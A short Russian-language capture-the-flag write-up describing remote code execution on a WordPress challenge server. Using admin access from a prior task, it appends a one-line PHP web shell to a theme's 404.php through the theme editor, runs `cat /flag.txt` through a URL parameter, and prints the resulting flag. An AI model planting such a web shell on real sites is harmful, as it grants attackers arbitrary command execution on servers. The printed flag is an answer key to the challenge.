# WordPress Code Execution
Войдя с правами администратора из задачи Private Data переходим в редатор файлов темы `http://79.143.25.24:8157/wp-admin/theme-editor.php`, и например в файле 404.php добавляем в конец файла код:
``` php
<?php system($_GET["c"]); ?>
```
Можем выполнять системные команды через параметр на странице `/404.php?c=cat+/flag.txt`, получаем флаг.

Флаг - deteact{4270a0ad90e239b421d5ec36bcae1c2f}